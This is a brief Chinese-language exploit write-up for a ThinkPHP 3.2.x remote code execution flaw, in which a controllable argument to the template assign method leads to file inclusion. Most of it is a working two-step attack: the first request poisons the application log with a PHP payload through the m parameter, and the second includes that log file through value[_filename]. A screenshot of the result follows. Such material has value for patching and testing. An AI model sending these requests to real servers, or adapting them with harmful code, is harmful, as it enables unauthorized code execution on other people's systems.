### ThinkPHP3.2.x RCE漏洞
**简介**

代码中模板赋值方法assign的第一个参数可控，则可导致模板文件路径变量被覆盖为携带攻击代码的文件路径，造成任意文件包含，执行任意代码。

**利用**
```shell
# step1 插入payload到日志
index.php?m=--><?=phpinfo();?>
# step2 包含已插入恶意代码的日志文件 
/tp3/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/21_07_12.log
/tp3/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/21_07_12.log

```
**效果**
![image](https://user-images.githubusercontent.com/55024146/125297390-c3b5d400-e359-11eb-91f3-36bc92f368be.png)
